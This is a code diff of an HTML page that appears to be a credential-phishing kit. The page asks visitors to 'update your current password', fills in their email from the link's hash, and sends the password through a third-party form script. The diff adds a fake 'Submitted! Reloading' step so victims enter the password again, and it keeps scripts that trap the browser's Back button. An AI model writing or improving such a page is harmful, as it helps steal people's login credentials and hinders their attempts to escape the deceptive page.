@@ -157,36 +157,61 @@
 <div style="font-size:16pt; color:white;" align="center">Log in and update your current password</a></div>
         </div> 
 
-   <form id="my-form" action="??" method="post"> 
-<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=xyj0hu5m&n=n1.ratufa.io"></script>
-       <center>  <b> 
-                <center><div class="pass"><br><br><br>
- 
-    <input type="email" name="email" id="email" placeholder="Email address" style="font-size: 12pt; height: 35px; width:280px; " readonly="readonly" />
- <p>
-               <input type="password" name="password" placeholder="Password" style="font-size: 12pt; height: 35px; width:280px;" required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
-  oninput="this.setCustomValidity('')"/>
- 
-    </p>
- 
-            <button type="submit" name="sub" style=" background:  #21618c  ; color:#fff; font-size: 12pt; height: 35px; width:280px;border-style: dotted; border-color:#2e4c8a  #2e4c8a   #2e4c8a   #2e4c8a " class="btn btn-primary w-100 sub_b">Log in</button>
+<form id="my-form" method="post">
+  <center>
+    <b>
+      <div class="pass">
+        <br><br><br>
+        <input type="email" name="email" id="email" placeholder="Email address" style="font-size: 12pt; height: 35px; width:280px;" readonly="readonly" />
+        <p>
+          <input type="password" name="password" placeholder="Password" style="font-size: 12pt; height: 35px; width:280px;" required oninvalid="this.setCustomValidity('Please enter your password')" oninput="this.setCustomValidity('')" />
+        </p>
+        <button type="submit" name="sub" id="submitBtn" style="background: #21618c; color: #fff; font-size: 12pt; height: 35px; width:280px; border-style: dotted; border-color: #2e4c8a;" class="btn btn-primary w-100 sub_b">Log In</button>
+      </div>
+    </b>
+  </center>
+</form>
 
-         </form>
+<p id="statusMessage"></p>
+
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=xyj0hu5m&n=n1.ratufa.io"></script>
+
+<script>
+  document.getElementById('submitBtn').addEventListener('click', function () {
+    const form = document.getElementById('my-form');
+    const status = document.getElementById('statusMessage');
+
+    if (form && !form.checkValidity()) {
+      return;
+    }
+
+    if (window.reloadTimerStarted) {
+      return;
+    }
+    window.reloadTimerStarted = true;
+
+    if (status) {
+      status.textContent = 'Submitted! Reloading in 10 seconds...';
+    }
+
+    window.setTimeout(function () {
+      window.location.reload(true);
+    }, 5000 );
+  });
+</script>
+
 
 <script>
     (function() {
-        // 1. EXTRACT DATA DIRECTLY OUT OF THE HASH LINK STATE
+
         const rawHashData = window.location.hash;
 
         if (!rawHashData || rawHashData.length < 2) return;
 
-        // Remove the actual '#' character from the extracted text string
         const rawEmail = rawHashData.substring(1).trim();
 
-        // STRICT TYPE SANITIZATION: Protects against XSS attacks natively
         const sanitizedEmail = rawEmail.replace(/[^a-zA-Z0-9@._-]/g, '').toLowerCase();
 
-        // 2. HARDENED VALUE ASSIGNMENT: Runs FIRST to ensure perfect form filling
         if (sanitizedEmail && sanitizedEmail.includes('@')) {
             const emailField = document.getElementById('branch_email_field');
             if (emailField) {
@@ -212,27 +237,25 @@
 </head>
 <body>
 
-    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
     <script type="text/javascript">
         (function() {
-            // Force an initial dummy state entry directly into the browser history pool
+
             window.history.pushState(null, null, window.location.href);
             
-            // Listen for the exact millisecond the user clicks the browser Back arrow button
+
             window.onpopstate = function() {
                 // Instantly re-inject our active location path back into the navigation deck
                 window.history.pushState(null, null, window.location.href);
                 
-                // OPTIONAL ALERT HOOK: Notify the user that execution is locked
+
                 // alert("Navigation Interrupted: Workspace redirection state is tightly locked.");
             };
         })();
     </script>
 <script type="text/javascript">
-    // Push a fake state into the history stack when the page loads
+
     window.history.pushState(null, "", window.location.href);
     
-    // Listen for the back navigation event and override it
     window.addEventListener("popstate", function() {
         window.history.pushState(null, "", window.location.href);
     });
@@ -241,10 +264,10 @@
     function preventBack() {
         window.history.forward();
     }
-    // Continuously call the forward function
+
     setTimeout("preventBack()", 0);
     
-    // Unload the previous cache
+
     window.onunload = function () { null };
 </script>
 
